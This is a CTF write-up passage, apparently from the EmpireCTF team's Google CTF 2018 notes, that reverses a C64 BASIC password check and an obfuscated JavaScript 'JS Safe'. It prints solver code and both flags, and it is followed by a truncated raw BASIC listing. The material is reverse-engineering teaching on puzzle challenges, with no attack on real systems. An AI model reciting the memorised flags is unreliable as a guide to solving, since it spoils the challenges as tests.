= 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n    0F7E:  2030: IF BA AND 1 THEN P0 = 0.062500000001818989403545856475830078125\n    0FBC:  2031: IF BA AND 2 THEN P1 = 0.0156250000004547473508864641189575195312\n    0FFB:  2032: IF BA AND 4 THEN P2 = 0.0039062500001136868377216160297393798828\n    103A:  2033: IF BA AND 8 THEN P3 = 0.0009765625000284217094304040074348449707\n    1079:  2034: IF BA AND 16 THEN P4 = 0.0002441406250071054273576010018587112427\n    10B9:  2035: IF BA AND 32 THEN P5 = 0.0000610351562517763568394002504646778107\n    10F9:  2036: IF BA AND 64 THEN P6 = 0.0000152587890629440892098500626161694527\n    1139:  2037: IF BA AND 128 THEN P7 = 0.0000038146972657360223024625156540423632\n    117A:  2040: IF BB AND 1 THEN P8 = 0.0000009536743164340055756156289135105908\n    11B9:  2031: IF BB AND 2 THEN P9 = 0.0000002384185791085013939039072283776477\n    11F8:  2032: IF BB AND 4 THEN PA = 0.0000000596046447771253484759768070944119\n    1237:  2033: IF BB AND 8 THEN PB = 0.000000014901161194281337118994201773603\n    1275:  2034: IF BB AND 16 THEN PC = 0.0000000037252902985703342797485504434007\n    12B5:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n    1300:  2060: G = 0.671565706376017\n    131A:  2100: T0 = K = G : A = 86 : B = 10\n    133B:  2200: IF T0 = -1 THEN A = 83 : B = 5\n    135A:  2210: POKE 1024 + CHKOFF + 1, 90\n    1376:  2500: REM\n    137C:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n    ...\n\n([full listing here](scripts/back-to-the-basics/listing2.txt))\n\nIndeed, the binary blocks decoded to some password-checking code.\n\nLines `2020` and `2021` store individual characters of the password in `BA` and `BB`.\n\nLines `2030` through `2040`, then again `2031` through `2034` all check individual bits of the password characters and set the values of `P0 ... P9, PA, PB, PC` based on them.\n\nFinally, all of the `P` values (and `V`) are summed and the result is compared to `G`. If the value matches exactly, `A` is set to the heart symbol (line `2200`), otherwise it remains a cross (line `2100`).\n\nThe fact that the condition is exact match and that the lines show decimal values with so many digits made me worry at first - do we need to have an exact C64-like implementation of decimal arithmetics for this to work? Do we need to write our password cracker in BASIC?\n\nBut perhaps trying to find the closest solution using regular 64-bit IEEE floats will work just as well. Each of the 19 blocks checks 13 bits, giving a total of 247 bits checked. This is 7 more bits than there are in our 30-byte password. If we check the last block, it checks a dummy `BX` variable, and its value will always be `0` - so the 19th check really only checks 6 bits.\n\nSo we need to crack 19 checks with 13 bits of data each - this gives 8K possible combinations, very easily brute-forceable. We write our cracker and print out the characters (we would normally have to convert PETSCII into ASCII, but fortunately the password comprises of ASCII-equivalent characters):\n\n([full solver script](scripts/back-to-the-basics/Solve.hx))\n\n    $ haxe --run Solve\n    ...\n    PASSWORD: LINKED-LISTS-AND-40-BIT-FLOATS\n\nAnd it works! BASIC lines form linked lists as described above, and luckily we didn't need to get into the specifics of 40-bit C64 floats.\n\n![](screens/back-to-the-basics4.png)\n\n`CTF{LINKED-LISTS-AND-40-BIT-FLOATS}`\n\n## 121 Web / JS Safe 2.0 ##\n\n**Description**\n\n> You stumbled upon someone's \"JS Safe\" on the web. It's a simple HTML file that can store secrets in the browser's localStorage. This means that you won't be able to extract any secret from it (the secrets are on the computer of the owner), but it looks like it was hand-crafted to work only with the password of the owner...\n\n**Files provided**\n\n - [a ZIP file](files/js-safe.zip) containing:\n   - `js_safe_2.html` - an HTML file with obfuscated JavaScript\n\n**Solution**\n\nWe are presented with a website showing a password input. After entering a password, it seems to check whether or not it is correct and says `ACCESS DENIED`.\n\n![](screens/js-safe1.png)\n\nLet's see the source code. There is a comment:\n\n    <!--\n    Advertisement:\n    Looking for a hand-crafted, browser based virtual safe to store your most\n    interesting secrets? Look no further, you have found it. You can order your own\n    by sending a mail to js_safe@example.com. When ordering, please specify the\n    password you'd like to use to open and close the safe. We'll hand craft a\n    unique safe just for you, that only works with your password of choice.\n    -->\n\nThere is some CSS to make the website look pretty, some HTML to create the form, but most importantly the JavaScript:\n\n    <script>\n    function x(х){ord=Function.prototype.call.bind(''.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a=='undefined'?1:a)+ord(str(s[i])))%65521;b=((typeof b=='undefined'?0:b)+a)%65521}return chr(b>>8)+chr(b&0xFF)+chr(a>>8)+chr(a&0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||'')+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log('debug',source);with(source)return eval('eval(c(source,x))')}catch(e){}}\n    </script>\n    <script>\n    function open_safe() {\n      keyhole.disabled = true;\n      password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);\n      if (!password || !x(password[1])) return document.body.className = 'denied';\n      document.body.className = 'granted';\n      password = Array.from(password[1]).map(c => c.charCodeAt());\n      encrypted = JSON.parse(localStorage.content || '');\n      content.value = encrypted.map((c,i) => c ^ password[i % password.length]).map(String.fromCharCode).join('')\n    }\n    function save() {\n      plaintext = Array.from(content.value).map(c => c.charCodeAt());\n      localStorage.content = JSON.stringify(plaintext.map((c,i) => c ^ password[i % password.length]));\n    }\n    </script>\n\n`open_safe` is called when we enter a password. `save` seems to be a function used once the \"safe\" is unlocked. Apparently it just uses the `localStorage` (present in the browser and saved on the disk) and XOR encryption to \"securely\" store data.\n\nImportant to us is the `password` regular expression - we need to enter `CTF{...}` as the password, using only numbers, letters, and the symbols `_`, `@`, `!`, `?`, and `-` between the curly braces. The actual password check is done by calling the function `x` with the inner part of the password (excluding `CTF{` and `}`).\n\nLet's prettify the function `x` and look a it bit by bit:\n\n    function x(х){\n      ord=Function.prototype.call.bind(''.charCodeAt);\n      chr=String.fromCharCode;\n      str=String;\n\nFirst, three shortcut functions are defined. `ord`, `chr`, and `str`.\n\n - `ord` - converts a (Unicode) character to its Unicode codepoint, a number\n - `chr` - converts a Unicode codepoint to its string representation (opposite of `ord`)\n - `str` - stringifies a value\n\n      function h(s){\n        for(i=0;i!=s.length;i++){\n          a=((typeof a=='undefined'?1:a)+ord(str(s[i])))%65521;\n          b=((typeof b=='undefined'?0:b)+a)%65521\n        }\n        return chr(b>>8)+chr(b&0xFF)+chr(a>>8)+chr(a&0xFF)\n      }\n\nThe next, inner, function is `h`, which seems to be a simple hashing algorithm. It iterates all the characters of its argument, adding their Unicode values to an accumulator, and adding the accumulator to another indirect accumulator. Finally, the two variables `a` and `b` are converted to a 4-byte string (which may or may not be 4 characters!).\n\n      function c(a,b,c){\n        for(i=0;i!=a.length;i++)\n          c=(c||'')+chr(ord(str(a[i]))^ord(str(b[i%b.length])));\n        return c\n      }\n\nFinally, `c` is an encryption function. It simply XOR encrypts `a` using a repeating key `b`.\n\n      for(a=0;a!=1000;a++)\n        debugger;\n\nThen we see the first *obvious* anti-RE technique. It is a loop that runs 1000 times and tries to run `debugger` each time. This only has effect if the browser's developer tools are open. We can remove this loop to prevent this. This lets us debug the function, but it is also a big mistake - we'll see why in a bit!\n\n      x=h(str(x));\n\nThen `x` is assigned to the hash of the stringified value `x`. This should be the password, right?\n\nWrong - if we put a `debugger` statement just before this line, we can check what the value of `x` is. We can simply type `x` into the console, assuming we are currently paused inside the function. `x` always evaluates to the function itself, not the argument provided! It's not unusual that you can refer to the function within itself, this is what makes recursion possible. But what is weird is that the argument given to this function is also `x`, so thanks to aliasing inside the function `x` should refer to the argument, not the function.\n\nWell, after some more analysis, we can find out that this script uses a fairly common technique in JavaScript obfuscation. The argument of the function is not `x`. It is `х`. Most fonts will render these characters the same, but the latter is actually [cyrillic small letter ha](https://unicodelookup.com/#%D1%85/1). We can confirm this if we look at the hexdump of the file. What is also curious is that the argument is never mentioned inside the function except in the function signature.\n\nAnyway, after executing the last line, `x` is now the hash of the stringified version of the function itself. This is important - we have modified the function already by prettifying it. Any whitespace is kept by JavaScript when it stringifies the function. But we can circument this - we open the original file, find out the string representation of the original `x` function, and in our working copy we put:\n\n      x = h(\"function x(х){ord=Function.prototype.call.bind(''.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a=='undefined'?1:a)+ord(str(s[i])))%65521;b=((typeof b=='undefined'?0:b)+a)%65521}return chr(b>>8)+chr(b&0xFF)+chr(a>>8)+chr(a&0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||'')+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log('debug',source);with(source)return eval('eval(c(source,x))')}catch(e){}}\");\n\nMoving on:\n\n      source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&òªћ#³­1᧨/;\n      source.toString=function(){return c(source,x)};\n\n`source` is given as a regular expression, containing a bunch of Unicode data. It is important to parse it as Unicode, since this is how JavaScript understands string values (and regular expressions as well). Additionally, `toString` is set on `source` to run the encryption function. This last bit is somewhat weird. JavaScript does use the `toString` method of an object (if it exists) when it tries to stringify it. However, inside `c`, the first argument needs to be stringified. I believe this is another, slightly more subtle, anti-RE technique - every time we try to see what the value of `source` is in the console, it results in an infinite loop.\n\n      try{\n        console.log('debug',source);\n        with(source)return eval('eval(c(source,x))')\n      }catch(e){}\n\nFinally, in a `try ... catch` block, we first have a `console.log` statement, which will enter the aforementioned infinite loop if the developer tools are open. Then a rarely used feature of JavaScript, [`with`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) is used to make the properties of `source` available globally. In particular, this might mean that the global `toString` function is the one defined on `source`, which will always return `c(source, x)`. Inside the `with` block, we perform a nested `eval` - `c(source, x)` is executed as JavaScript code and the result of this is once again executed as JavaScript code.\n\nAny errors that might occur in this process are caught and silently ignored because of the `try ... catch` block. For this entire password check to be successful, the `x` function needs to return a [truthy value](https://developer.mozilla.org/en-US/docs/Glossary/Truthy), and the only `return` is the value obtained from the double-`eval` construct.\n\nThere is one final anti-RE technique that is more subtle than the others. Normally, JavaScript variables are declared with `var`. In more modern syntax, `let` or `const` is used. Not a single `var` can be found in the script. This is not an error (a mantra in JavaScript) - the code still runs just fine. Whenever a variable is used without declaring it with `var`, the global scope will be used. This generally means the variables are created on the `window` object. However, function argument names are implicitly declared as local variables and these will not be created as `window` properties! With this in mind, let's list all the global variables used in the script:\n\n - `x` - initially the password-checking function, later overridden with the function's hash\n - `ord`, `chr`, `str`\n - inside the function `h`:\n   - the loop variable `i` is global, although it is zeroed out before use\n   - `a`, `b` are both global and a default value is only used if they were `undefined` (i.e. undeclared) beforehand\n - in the anti-RE `debugger` loop, `a` is global\n - `source`\n\nWe can notice something very important in the list above - the global variable `a` is used both inside `h` and inside the anti-RE loop. Before `h` is even called for the first time, `a` is already set to `1000`. If we simply remove the loop, `a` will be `undefined` before `h` is called, giving an incorrect result.\n\nNow we can start peeling off the layers of protection. As mentioned above the actual password value (stored in the cyrillic `х`) has not been used in any of the code we can see so far. This means that the first steps of decrypting the `source` variable are not done based on user input, so we should be able to reproduce them ourselves.\n\nKeeping in mind that `a` is initialised to `1000` before `h` is called, we can calculate the hash of the function:\n\n    let ord = Function.prototype.call.bind(''.charCodeAt);\n    let chr = String.fromCharCode;\n    let s = \"function x(х){ord=Function.prototype.call.bind(''.charCodeAt);chr=String.fromCharCode;str=String;function h(s){for(i=0;i!=s.length;i++){a=((typeof a=='undefined'?1:a)+ord(str(s[i])))%65521;b=((typeof b=='undefined'?0:b)+a)%65521}return chr(b>>8)+chr(b&0xFF)+chr(a>>8)+chr(a&0xFF)}function c(a,b,c){for(i=0;i!=a.length;i++)c=(c||'')+chr(ord(str(a[i]))^ord(str(b[i%b.length])));return c}for(a=0;a!=1000;a++)debugger;x=h(str(x));source=/Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&òªћ#³­1᧨/;source.toString=function(){return c(source,x)};try{console.log('debug',source);with(source)return eval('eval(c(source,x))')}catch(e){}}\";\n    let a = 1000;\n    let b = 0;\n    for (let i=0; i != s.length; i++) {\n      a = (a + ord(s[i])) % 65521;\n      b = (b + a) % 65521;\n    }\n    let ret = chr(b >> 8) + chr(b & 0xFF) + chr(a >> 8) + chr(a & 0xFF);\n    console.log([b >> 8, b & 0xFF, a >> 8, a & 0xFF]);\n    console.log(ret);\n    console.log(ret.length);\n\nThe first `console.log` prints `[130, 30, 10, 154]`. None of these are printable characters, but JavaScript still considers the string to be 4 characters long.\n\nSo let's try to XOR-decrypt `source` with the above key. Even though it is given as a regular expression with a weird `toString` function, let's just see what happens if we put it in a string and decrypt that:\n\n    let ord = Function.prototype.call.bind(''.charCodeAt);\n    let chr = String.fromCharCode;\n    let a = \"Ӈ#7ùª9¨M¤À.áÔ¥6¦¨¹.ÿÓÂ.Ö£JºÓ¹WþÊmãÖÚG¤¢dÈ9&òªћ#³­1᧨\";\n    let c = \"\";\n    let points = [];\n    for(i = 0; i != a.length; i++) {\n      let point = ord(a[i]) ^ [130, 30, 10, 154][i % 4];\n      points.push(point);\n      c = c + chr(point);\n    }\n    console.log(points);\n    console.log(c);\n\nIndeed, we get some valid JavaScript code!\n\n    х==c('¢×&Ê´cÊ¯¬$¶³´}ÍÈ´T©Ð8Í³Í|Ô÷aÈÐÝ&¨þJ',h(х))//᧢\n\nAnd in this fragment the `х` is actually the cyrillic `х` which contains our password. We are looking for a password which equals *something* when XOR decrypted with its own hash. We have two unknowns, both the password and its hash, so the solution is not direct.\n\nHowever, we know enough about the hashes and the password to break the cipher. The hashes returned by `h` are only 4 bytes long. This can decode into less than 4 characters if these bytes represent valid Unicode codepoints, but let's just treat them as 4 separate 8-bit integers. A key that is only 4 bytes long repeated over a 39+ character-long password is very vulnerable, since a quarter of these characters are decrypted with the same key character.\n\nAnd finally, we know that the password only consists of the characters  `0-9a-zA-Z_@!?-`, which combined with the repeating XOR key should be more than enough.\n\n([full solver script](scripts/JS.hx))\n\n    $ haxe --run JS.hx\n    _N3x7-v3R51ON-h45-AnTI-4NTi-ant1-D3bUg_\n\nThree of the hash numbers have a unique solution, one has two. One of these two gives the correct solution.\n\n![](screens/js-safe2.png)\n\n`CTF{_N3x7-v3R51ON-h45-AnTI-4NTi-ant1-D3bUg_}`\n", "timestamp": "2025-10-24T11:39:01.031576"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-06-23-Google-CTF-Quals/scripts/back-to-the-basics/listing1.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-06-23-Google-CTF-Quals/scripts/back-to-the-basics/listing1.txt", "content": "081E <- 0801:     1: REM ======================\n083A <- 081E:     2: REM === BACK TO BASICS ===\n0857 <- 083A:     3: REM ======================\n086B <- 0857:    10: PRINTCHR$(155):PRINTCHR$(147)\n0886 <- 086B:    20: POKE 53280, 6:POKE 53281, 6:\n0898 <- 0886:    25: PRINT\"LOADING...\"\n---- <- 0898: -----: <BINARY>\n---- <- 0913: -----: <BINARY>\n---- <- 0991: -----: <BINARY>\n---- <- 0A0F: -----: <BINARY>\n---- <- 0A8D: -----: <BINARY>\n0B2F <- 0B09:    40: FOR I = 0 TO 39: POKE 55296 + I, 1: NEXT I\n0B57 <- 0B2F:    41: FOR I = 40 TO 79: POKE 55296 + I, 15: NEXT I\n0B80 <- 0B57:    42: FOR I = 80 TO 119: POKE 55296 + I, 12: NEXT I\n0BAA <- 0B80:    43: FOR I = 120 TO 159: POKE 55296 + I, 11: NEXT I\n0BD3 <- 0BAA:    44: FOR I = 160 TO 199: POKE 55296 + I, 0: NEXT I\n0BE5 <- 0BD3:    50: FOR I = 0 TO 199\n0BFD <- 0BE5:    51: READ C : POKE 1024 + I, C\n0C05 <- 0BFD:    52: NEXT I\n0C13 <- 0C05:    60: PRINT:PRINT:PRINT:PRINT:PRINT\n0C4A <- 0C13:    70: POKE 19,1: PRINT\"PASSWORD PLEASE?\" CHR$(5): INPUT \"\"; P$: POKE 19,0\n0C9E <- 0C4A:    80: PRINT:PRINT:PRINTCHR$(155) \"PROCESSING... (THIS MIGHT TAKE A WHILE)\":PRINT\"[                    ]\"\n0CB7 <- 0C9E:    90: CHKOFF = 11 * 40 + 1\n0CD0 <- 0CB7:   200: IF LEN(P$) = 30 THEN GOTO 250\n0D05 <- 0CD0:   210: POKE 1024 + CHKOFF + 0, 86:POKE 55296 + CHKOFF + 0, 10\n0D11 <- 0D05:   220: GOTO 31337\n0D45 <- 0D11:   250: POKE 1024 + CHKOFF + 0, 83:POKE 55296 + CHKOFF + 0, 5\n0D63 <- 0D45:  2000: REM NEVER GONNA GIVE YOU UP\n0D69 <- 0D63:  2001: REM\n0D96 <- 0D69:  2010: POKE 03397, 00199 : POKE 03398, 00013 : GOTO 2001\n0DB5 <- 0D96: 31337: PRINT:PRINT\"VERDICT: NOPE\":GOTO 31345\n0DC1 <- 0DB5: 31345: GOTO 31345\n0000 <- 0DC1:     0: REM\n0DEB <- 0DC7:  2001: POKE 03397, 00069 : POKE 03398, 00013\n0E1F <- 0DEB:  2002: POKE 1024 + CHKOFF + 1, 81:POKE 55296 + CHKOFF + 1, 7\n0E46 <- 0E1F:  2004: ES = 03741 : EE = 04981 : EK = 148\n0E81 <- 0E46:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n0E9D <- 0E81:  2009: POKE 1024 + CHKOFF + 1, 87\n---- <- 0E9D: -----: <BINARY>\n13B7 <- 137C:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n13EA <- 13B7:  2905: POKE 1024 + CHKOFF + 1, A:POKE 55296 + CHKOFF + 1, B\n1417 <- 13EA:  2910: POKE 03397, 00029 : POKE 03398, 00020 : GOTO 2001\n0000 <- 1417:     0: REM\n1441 <- 141D:  2001: POKE 03397, 00069 : POKE 03398, 00013\n1475 <- 1441:  2002: POKE 1024 + CHKOFF + 2, 81:POKE 55296 + CHKOFF + 2, 7\n149C <- 1475:  2004: ES = 05363 : EE = 06632 : EK = 152\n14D7 <- 149C:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n14F3 <- 14D7:  2009: POKE 1024 + CHKOFF + 2, 87\n---- <- 14F3: -----: <BINARY>\nF370 <- 19B1: 48264: PRINTLET%LET%PRINTLET%LETSTEPLET%LETCLOSELISTLETNEWLET+LET%LETCMDhQFOR%p%LETPRINTPRINT#CONTCLRLET%LET-OR<USR^^LET%LETCONTSAVELETGETPRINT#h%%STR$%REM\n1A2A <- 19EF:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n1A5D <- 1A2A:  2905: POKE 1024 + CHKOFF + 2, A:POKE 55296 + CHKOFF + 2, B\n1A8A <- 1A5D:  2910: POKE 03397, 00144 : POKE 03398, 00026 : GOTO 2001\n0000 <- 1A8A:     0: REM\n1AB4 <- 1A90:  2001: POKE 03397, 00069 : POKE 03398, 00013\n1AE8 <- 1AB4:  2002: POKE 1024 + CHKOFF + 3, 81:POKE 55296 + CHKOFF + 3, 7\n1B0F <- 1AE8:  2004: ES = 07014 : EE = 08219 : EK = 165\n1B4A <- 1B0F:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n1B66 <- 1B4A:  2009: POKE 1024 + CHKOFF + 3, 87\n---- <- 1B66: -----: <BINARY>\n205D <- 2022:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n2090 <- 205D:  2905: POKE 1024 + CHKOFF + 3, A:POKE 55296 + CHKOFF + 3, B\n20BD <- 2090:  2910: POKE 03397, 00195 : POKE 03398, 00032 : GOTO 2001\n0000 <- 20BD:     0: REM\n20E7 <- 20C3:  2001: POKE 03397, 00069 : POKE 03398, 00013\n211B <- 20E7:  2002: POKE 1024 + CHKOFF + 4, 81:POKE 55296 + CHKOFF + 4, 7\n2142 <- 211B:  2004: ES = 08601 : EE = 09868 : EK = 184\n217D <- 2142:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n2199 <- 217D:  2009: POKE 1024 + CHKOFF + 4, 87\n---- <- 2199: -----: <BINARY>\n26CE <- 2693:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n2701 <- 26CE:  2905: POKE 1024 + CHKOFF + 4, A:POKE 55296 + CHKOFF + 4, B\n272E <- 2701:  2910: POKE 03397, 00052 : POKE 03398, 00039 : GOTO 2001\n0000 <- 272E:     0: REM\n2758 <- 2734:  2001: POKE 03397, 00069 : POKE 03398, 00013\n278C <- 2758:  2002: POKE 1024 + CHKOFF + 5, 81:POKE 55296 + CHKOFF + 5, 7\n27B3 <- 278C:  2004: ES = 10250 : EE = 11483 : EK = 199\n27EE <- 27B3:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n280A <- 27EE:  2009: POKE 1024 + CHKOFF + 5, 87\n---- <- 280A: -----: <BINARY>\n2D1D <- 2CE2:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n2D50 <- 2D1D:  2905: POKE 1024 + CHKOFF + 5, A:POKE 55296 + CHKOFF + 5, B\n2D7D <- 2D50:  2910: POKE 03397, 00131 : POKE 03398, 00045 : GOTO 2001\n0000 <- 2D7D:     0: REM\n2DA7 <- 2D83:  2001: POKE 03397, 00069 : POKE 03398, 00013\n2DDB <- 2DA7:  2002: POKE 1024 + CHKOFF + 6, 81:POKE 55296 + CHKOFF + 6, 7\n2E02 <- 2DDB:  2004: ES = 11865 : EE = 13107 : EK = 240\n2E3D <- 2E02:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n2E59 <- 2E3D:  2009: POKE 1024 + CHKOFF + 6, 87\n---- <- 2E59: -----: <BINARY>\n---- <- 2FBB: -----: <BINARY>\n---- <- 31B8: -----: <BINARY>\n3375 <- 333A:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n33A8 <- 3375:  2905: POKE 1024 + CHKOFF + 6, A:POKE 55296 + CHKOFF + 6, B\n33D5 <- 33A8:  2910: POKE 03397, 00219 : POKE 03398, 00051 : GOTO 2001\n0000 <- 33D5:     0: REM\n33FF <- 33DB:  2001: POKE 03397, 00069 : POKE 03398, 00013\n3433 <- 33FF:  2002: POKE 1024 + CHKOFF + 7, 81:POKE 55296 + CHKOFF + 7, 7\n345A <- 3433:  2004: ES = 13489 : EE = 14760 : EK = 249\n3495 <- 345A:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n34B1 <- 3495:  2009: POKE 1024 + CHKOFF + 7, 87\n---- <- 34B1: -----: <BINARY>\n39EA <- 39AF:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n3A1D <- 39EA:  2905: POKE 1024 + CHKOFF + 7, A:POKE 55296 + CHKOFF + 7, B\n3A4A <- 3A1D:  2910: POKE 03397, 00080 : POKE 03398, 00058 : GOTO 2001\n0000 <- 3A4A:     0: REM\n3A74 <- 3A50:  2001: POKE 03397, 00069 : POKE 03398, 00013\n3AA8 <- 3A74:  2002: POKE 1024 + CHKOFF + 8, 81:POKE 55296 + CHKOFF + 8, 7\n3ACF <- 3AA8:  2004: ES = 15142 : EE = 16351 : EK = 132\n3B0A <- 3ACF:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n3B26 <- 3B0A:  2009: POKE 1024 + CHKOFF + 8, 87\n---- <- 3B26: -----: <BINARY>\n---- <- 3F6B: -----: <BINARY>\n4021 <- 3FE6:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4054 <- 4021:  2905: POKE 1024 + CHKOFF + 8, A:POKE 55296 + CHKOFF + 8, B\n4081 <- 4054:  2910: POKE 03397, 00135 : POKE 03398, 00064 : GOTO 2001\n0000 <- 4081:     0: REM\n40AB <- 4087:  2001: POKE 03397, 00069 : POKE 03398, 00013\n40DF <- 40AB:  2002: POKE 1024 + CHKOFF + 9, 81:POKE 55296 + CHKOFF + 9, 7\n4106 <- 40DF:  2004: ES = 16733 : EE = 17975 : EK = 186\n4141 <- 4106:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n415D <- 4141:  2009: POKE 1024 + CHKOFF + 9, 87\n---- <- 415D: -----: <BINARY>\n---- <- 447C: -----: <BINARY>\n4679 <- 463E:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n46AC <- 4679:  2905: POKE 1024 + CHKOFF + 9, A:POKE 55296 + CHKOFF + 9, B\n46D9 <- 46AC:  2910: POKE 03397, 00223 : POKE 03398, 00070 : GOTO 2001\n0000 <- 46D9:     0: REM\n4703 <- 46DF:  2001: POKE 03397, 00069 : POKE 03398, 00013\n4739 <- 4703:  2002: POKE 1024 + CHKOFF + 10, 81:POKE 55296 + CHKOFF + 10, 7\n4760 <- 4739:  2004: ES = 18360 : EE = 19633 : EK = 214\n479B <- 4760:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n47B8 <- 479B:  2009: POKE 1024 + CHKOFF + 10, 87\n---- <- 47B8: -----: <BINARY>\n4CF3 <- 4CB8:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4D28 <- 4CF3:  2905: POKE 1024 + CHKOFF + 10, A:POKE 55296 + CHKOFF + 10, B\n4D55 <- 4D28:  2910: POKE 03397, 00091 : POKE 03398, 00077 : GOTO 2001\n0000 <- 4D55:     0: REM\n4D7F <- 4D5B:  2001: POKE 03397, 00069 : POKE 03398, 00013\n4DB5 <- 4D7F:  2002: POKE 1024 + CHKOFF + 11, 81:POKE 55296 + CHKOFF + 11, 7\n4DDC <- 4DB5:  2004: ES = 20020 : EE = 21265 : EK = 245\n4E17 <- 4DDC:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4E34 <- 4E17:  2009: POKE 1024 + CHKOFF + 11, 87\n---- <- 4E34: -----: <BINARY>\n---- <- 50D7: -----: <BINARY>\nA35D <- 52D7: 38419: +_L+EXP+ABS<+=+L+EXP+C>+E+M+EXP+@%%^/%NEW+<;=?+INT+NSVZQQ+INT+<<7+D;%%SSTR$%REM\n5353 <- 5318:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n5388 <- 5353:  2905: POKE 1024 + CHKOFF + 11, A:POKE 55296 + CHKOFF + 11, B\n53B5 <- 5388:  2910: POKE 03397, 00187 : POKE 03398, 00083 : GOTO 2001\n0000 <- 53B5:     0: REM\n53DF <- 53BB:  2001: POKE 03397, 00069 : POKE 03398, 00013\n5415 <- 53DF:  2002: POKE 1024 + CHKOFF + 12, 81:POKE 55296 + CHKOFF + 12, 7\n543C <- 5415:  2004: ES = 21652 : EE = 22923 : EK = 203\n5477 <- 543C:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n5494 <- 5477:  2009: POKE 1024 + CHKOFF + 12, 87\n---- <- 5494: -----: <BINARY>\n59CD <- 5992:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n5A02 <- 59CD:  2905: POKE 1024 + CHKOFF + 12, A:POKE 55296 + CHKOFF + 12, B\n5A2F <- 5A02:  2910: POKE 03397, 00053 : POKE 03398, 00090 : GOTO 2001\n0000 <- 5A2F:     0: REM\n5A59 <- 5A35:  2001: POKE 03397, 00069 : POKE 03398, 00013\n5A8F <- 5A59:  2002: POKE 1024 + CHKOFF + 13, 81:POKE 55296 + CHKOFF + 13, 7\n5AB6 <- 5A8F:  2004: ES = 23310 : EE = 24584 : EK = 223\n5AF1 <- 5AB6:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n5B0E <- 5AF1:  2009: POKE 1024 + CHKOFF + 13, 87\n---- <- 5B0E: -----: <BINARY>\n604A <- 600F:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n607F <- 604A:  2905: POKE 1024 + CHKOFF + 13, A:POKE 55296 + CHKOFF + 13, B\n60AC <- 607F:  2910: POKE 03397, 00178 : POKE 03398, 00096 : GOTO 2001\n0000 <- 60AC:     0: REM\n60D6 <- 60B2:  2001: POKE 03397, 00069 : POKE 03398, 00013\n610C <- 60D6:  2002: POKE 1024 + CHKOFF + 14, 81:POKE 55296 + CHKOFF + 14, 7\n6133 <- 610C:  2004: ES = 24971 : EE = 26178 : EK = 237\n616E <- 6133:  2005: FOR 